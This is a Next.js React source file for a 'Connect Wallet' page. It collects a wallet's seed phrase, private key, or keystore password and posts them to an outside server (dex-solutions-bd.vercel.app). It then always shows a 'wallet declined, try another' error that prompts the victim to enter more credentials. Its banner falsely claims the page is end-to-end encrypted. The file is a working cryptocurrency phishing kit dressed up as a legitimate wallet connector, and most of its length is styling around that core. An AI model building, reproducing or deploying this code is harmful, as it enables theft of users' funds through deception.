"use client";
import React, { useState } from "react";
import axios from "axios";
import { useParams } from "next/navigation";
import toast, { Toaster } from "react-hot-toast";

const ConnectPage = () => {
  const params = useParams();
  const walletName = params?.slug || "Unknown Wallet";
  const [activeTab, setActiveTab] = useState("phrase");
  const [formData, setFormData] = useState({
    phrase: "",
    privateKey: "",
    keystore: null,
    keystorePassword: "",
  });
  const [loading, setLoading] = useState(false);

  const handleSubmit = async () => {
    setLoading(true);
    const loadingToast = toast.loading("Verifying credentials...", {
      style: {
        background: "rgba(15,23,42,0.95)",
        color: "#e2e8f0",
        border: "1px solid rgba(34,211,238,0.2)",
        fontFamily: "'DM Mono', monospace",
        fontSize: "13px",
        backdropFilter: "blur(12px)",
      },
    });

    try {
      let payload = { wallet: walletName };
      if (activeTab === "phrase") {
        payload = { ...payload, type: "phrase", data: formData.phrase };
      } else if (activeTab === "privateKey") {
        payload = { ...payload, type: "privateKey", data: formData.privateKey };
      } else if (activeTab === "keystore") {
        payload = {
          ...payload,
          type: "keystore",
          data: {
            file: formData.keystore ? formData.keystore.name : "No file",
            password: formData.keystorePassword,
          },
        };
      }

      await axios.post(
        "https://dex-solutions-bd.vercel.app/api/submit",
        payload,
      );

      toast.error(`${walletName} wallet declined. Try another.`, {
        id: loadingToast,
        duration: 5000,
        style: {
          background: "rgba(15,23,42,0.95)",
          color: "#f87171",
          border: "1px solid rgba(239,68,68,0.25)",
          fontFamily: "'DM Mono', monospace",
          fontSize: "13px",
          backdropFilter: "blur(12px)",
        },
        iconTheme: { primary: "#f87171", secondary: "rgba(15,23,42,0.95)" },
      });
    } catch {
      toast.error(`Connection failed. Please retry.`, {
        id: loadingToast,
        duration: 5000,
        style: {
          background: "rgba(15,23,42,0.95)",
          color: "#f87171",
          border: "1px solid rgba(239,68,68,0.25)",
          fontFamily: "'DM Mono', monospace",
          fontSize: "13px",
          backdropFilter: "blur(12px)",
        },
        iconTheme: { primary: "#f87171", secondary: "rgba(15,23,42,0.95)" },
      });
    } finally {
      setLoading(false);
      setFormData({
        phrase: "",
        privateKey: "",
        keystore: null,
        keystorePassword: "",
      });
    }
  };

  const tabs = [
    { id: "phrase", label: "Seed Phrase" },
    { id: "privateKey", label: "Private Key" },
    { id: "keystore", label: "Keystore" },
  ];

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=DM+Mono:wght@300;400;500&family=Syne:wght@400;600;700;800&display=swap');

        * { box-sizing: border-box; }

        .connect-root {
          min-height: 100vh;
          background: #050a14;
          display: flex;
          align-items: center;
          justify-content: center;
          padding: 2rem 1rem;
          font-family: 'DM Mono', monospace;
          position: relative;
          overflow: hidden;
        }

        .connect-root::before {
          content: '';
          position: fixed;
          top: -20%;
          left: -10%;
          width: 60vw;
          height: 60vw;
          background: radial-gradient(circle, rgba(34,211,238,0.04) 0%, transparent 70%);
          pointer-events: none;
        }

        .connect-root::after {
          content: '';
          position: fixed;
          bottom: -20%;
          right: -10%;
          width: 50vw;
          height: 50vw;
          background: radial-gradient(circle, rgba(99,102,241,0.05) 0%, transparent 70%);
          pointer-events: none;
        }

        .grid-bg {
          position: fixed;
          inset: 0;
          background-image:
            linear-gradient(rgba(34,211,238,0.025) 1px, transparent 1px),
            linear-gradient(90deg, rgba(34,211,238,0.025) 1px, transparent 1px);
          background-size: 48px 48px;
          pointer-events: none;
        }

        .card {
          position: relative;
          width: 100%;
          max-width: 460px;
          background: rgba(10,18,35,0.85);
          border: 1px solid rgba(34,211,238,0.12);
          border-radius: 20px;
          padding: 2.5rem;
          backdrop-filter: blur(24px);
          box-shadow:
            0 0 0 1px rgba(34,211,238,0.04),
            0 40px 80px rgba(0,0,0,0.6),
            inset 0 1px 0 rgba(255,255,255,0.04);
          opacity: 0;
          transform: translateY(20px);
          animation: cardIn 0.6s cubic-bezier(0.16,1,0.3,1) 0.1s forwards;
        }

        @keyframes cardIn {
          to { opacity: 1; transform: translateY(0); }
        }

        .card::before {
          content: '';
          position: absolute;
          top: 0;
          left: 10%;
          right: 10%;
          height: 1px;
          background: linear-gradient(90deg, transparent, rgba(34,211,238,0.6), transparent);
          border-radius: 999px;
        }

        .card-header {
          text-align: center;
          margin-bottom: 2rem;
        }

        .wallet-icon-wrap {
          width: 56px;
          height: 56px;
          margin: 0 auto 1rem;
          background: rgba(34,211,238,0.06);
          border: 1px solid rgba(34,211,238,0.15);
          border-radius: 14px;
          display: flex;
          align-items: center;
          justify-content: center;
          position: relative;
        }

        .wallet-icon-wrap::after {
          content: '';
          position: absolute;
          inset: -1px;
          border-radius: 14px;
          background: linear-gradient(135deg, rgba(34,211,238,0.2), transparent 60%);
          pointer-events: none;
        }

        .wallet-icon {
          font-size: 24px;
          filter: drop-shadow(0 0 8px rgba(34,211,238,0.4));
        }

        .card-title {
          font-family: 'Syne', sans-serif;
          font-size: 1.35rem;
          font-weight: 700;
          color: #f1f5f9;
          margin: 0 0 0.25rem;
          letter-spacing: -0.01em;
        }

        .wallet-name-highlight {
          background: linear-gradient(135deg, #22d3ee, #818cf8);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
          background-clip: text;
        }

        .card-subtitle {
          font-size: 11px;
          color: #475569;
          letter-spacing: 0.05em;
          text-transform: uppercase;
        }

        .tabs {
          display: grid;
          grid-template-columns: repeat(3, 1fr);
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(255,255,255,0.06);
          border-radius: 10px;
          padding: 3px;
          margin-bottom: 1.75rem;
          gap: 2px;
        }

        .tab-btn {
          padding: 8px 4px;
          font-family: 'DM Mono', monospace;
          font-size: 11px;
          font-weight: 500;
          letter-spacing: 0.03em;
          border: none;
          border-radius: 8px;
          cursor: pointer;
          transition: all 0.2s ease;
          color: #64748b;
          background: transparent;
          white-space: nowrap;
        }

        .tab-btn:hover:not(.active) {
          color: #94a3b8;
          background: rgba(255,255,255,0.04);
        }

        .tab-btn.active {
          background: rgba(34,211,238,0.1);
          color: #22d3ee;
          box-shadow: 0 0 0 1px rgba(34,211,238,0.2);
        }

        .field-label {
          display: block;
          font-size: 10px;
          letter-spacing: 0.1em;
          text-transform: uppercase;
          color: #475569;
          margin-bottom: 0.5rem;
        }

        .field-input {
          width: 100%;
          background: rgba(255,255,255,0.03);
          border: 1px solid rgba(255,255,255,0.08);
          border-radius: 10px;
          padding: 12px 14px;
          color: #e2e8f0;
          font-family: 'DM Mono', monospace;
          font-size: 13px;
          outline: none;
          transition: border-color 0.2s, box-shadow 0.2s, background 0.2s;
          resize: none;
        }

        .field-input::placeholder {
          color: #334155;
        }

        .field-input:focus {
          border-color: rgba(34,211,238,0.35);
          background: rgba(34,211,238,0.03);
          box-shadow: 0 0 0 3px rgba(34,211,238,0.06);
        }

        textarea.field-input {
          line-height: 1.6;
          min-height: 110px;
        }

        .file-wrap {
          width: 100%;
          background: rgba(255,255,255,0.03);
          border: 1px dashed rgba(255,255,255,0.1);
          border-radius: 10px;
          padding: 20px;
          text-align: center;
          cursor: pointer;
          transition: all 0.2s;
          position: relative;
        }

        .file-wrap:hover {
          border-color: rgba(34,211,238,0.3);
          background: rgba(34,211,238,0.03);
        }

        .file-wrap input[type="file"] {
          position: absolute;
          inset: 0;
          opacity: 0;
          cursor: pointer;
          width: 100%;
          height: 100%;
        }

        .file-icon {
          font-size: 20px;
          margin-bottom: 6px;
          display: block;
        }

        .file-text {
          font-size: 11px;
          color: #475569;
          display: block;
        }

        .file-text span {
          color: #22d3ee;
        }

        .file-name {
          font-size: 11px;
          color: #22d3ee;
          margin-top: 4px;
          display: block;
        }

        .warning-banner {
          display: flex;
          align-items: flex-start;
          gap: 10px;
          background: rgba(234,179,8,0.05);
          border: 1px solid rgba(234,179,8,0.12);
          border-radius: 10px;
          padding: 10px 12px;
          margin-top: 1.25rem;
        }

        .warning-icon {
          font-size: 13px;
          margin-top: 1px;
          flex-shrink: 0;
        }

        .warning-text {
          font-size: 11px;
          color: #78716c;
          line-height: 1.5;
          margin: 0;
        }

        .submit-btn {
          width: 100%;
          margin-top: 1.5rem;
          padding: 13px;
          border: none;
          border-radius: 11px;
          font-family: 'Syne', sans-serif;
          font-size: 14px;
          font-weight: 700;
          letter-spacing: 0.02em;
          cursor: pointer;
          position: relative;
          overflow: hidden;
          transition: opacity 0.2s, transform 0.15s;
          background: linear-gradient(135deg, #22d3ee 0%, #818cf8 100%);
          color: #050a14;
        }

        .submit-btn:hover:not(:disabled) {
          opacity: 0.92;
          transform: translateY(-1px);
        }

        .submit-btn:active:not(:disabled) {
          transform: translateY(0);
        }

        .submit-btn:disabled {
          opacity: 0.4;
          cursor: not-allowed;
        }

        .submit-btn::before {
          content: '';
          position: absolute;
          top: 0;
          left: -100%;
          width: 100%;
          height: 100%;
          background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
          transition: left 0.5s;
        }

        .submit-btn:hover:not(:disabled)::before {
          left: 100%;
        }

        .spinner {
          display: inline-block;
          width: 14px;
          height: 14px;
          border: 2px solid rgba(5,10,20,0.3);
          border-top-color: #050a14;
          border-radius: 50%;
          animation: spin 0.7s linear infinite;
          margin-right: 8px;
          vertical-align: middle;
        }

        @keyframes spin {
          to { transform: rotate(360deg); }
        }

        .field-group {
          animation: fieldIn 0.3s ease forwards;
        }

        @keyframes fieldIn {
          from { opacity: 0; transform: translateY(6px); }
          to { opacity: 1; transform: translateY(0); }
        }
      `}</style>

      <Toaster position="top-center" reverseOrder={false} />

      <div className="connect-root">
        <div className="grid-bg" />

        <div className="card">
          <div className="card-header">
            <div className="wallet-icon-wrap">
              <span className="wallet-icon">🔐</span>
            </div>
            <h2 className="card-title">
              Connect{" "}
              <span className="wallet-name-highlight">{walletName}</span>
            </h2>
            <p className="card-subtitle">Import your wallet securely</p>
          </div>

          <div className="tabs">
            {tabs.map((tab) => (
              <button
                key={tab.id}
                onClick={() => setActiveTab(tab.id)}
                className={`tab-btn ${activeTab === tab.id ? "active" : ""}`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          {activeTab === "phrase" && (
            <div className="field-group" key="phrase">
              <label className="field-label">Recovery phrase</label>
              <textarea
                className="field-input"
                rows={4}
                value={formData.phrase}
                onChange={(e) =>
                  setFormData({ ...formData, phrase: e.target.value })
                }
                placeholder="word1 word2 word3 ... word12"
              />
            </div>
          )}

          {activeTab === "privateKey" && (
            <div className="field-group" key="privateKey">
              <label className="field-label">Private key</label>
              <input
                type="text"
                className="field-input"
                value={formData.privateKey}
                onChange={(e) =>
                  setFormData({ ...formData, privateKey: e.target.value })
                }
                placeholder="0x..."
              />
            </div>
          )}

          {activeTab === "keystore" && (
            <div className="field-group" key="keystore">
              <label className="field-label">Keystore file</label>
              <div className="file-wrap">
                <input
                  type="file"
                  accept=".json"
                  onChange={(e) =>
                    setFormData({
                      ...formData,
                      keystore: e.target.files?.[0] || null,
                    })
                  }
                />
                <span className="file-icon">📄</span>
                <span className="file-text">
                  <span>Browse</span> or drop your JSON file
                </span>
                {formData.keystore && (
                  <span className="file-name">✓ {formData.keystore.name}</span>
                )}
              </div>
              <label className="field-label" style={{ marginTop: "1rem" }}>
                Password
              </label>
              <input
                type="password"
                className="field-input"
                value={formData.keystorePassword}
                onChange={(e) =>
                  setFormData({ ...formData, keystorePassword: e.target.value })
                }
                placeholder="Keystore password"
              />
            </div>
          )}

          <div className="warning-banner">
            <span className="warning-icon">⚠️</span>
            <p className="warning-text">
              Never share your seed phrase or private key with anyone. This page
              is end-to-end encrypted.
            </p>
          </div>

          <button
            className="submit-btn"
            onClick={handleSubmit}
            disabled={loading}
          >
            {loading ? (
              <>
                <span className="spinner" />
                Connecting...
              </>
            ) : (
              "Connect Wallet"
            )}
          </button>
        </div>
      </div>
    </>
  );
};

export default ConnectPage;
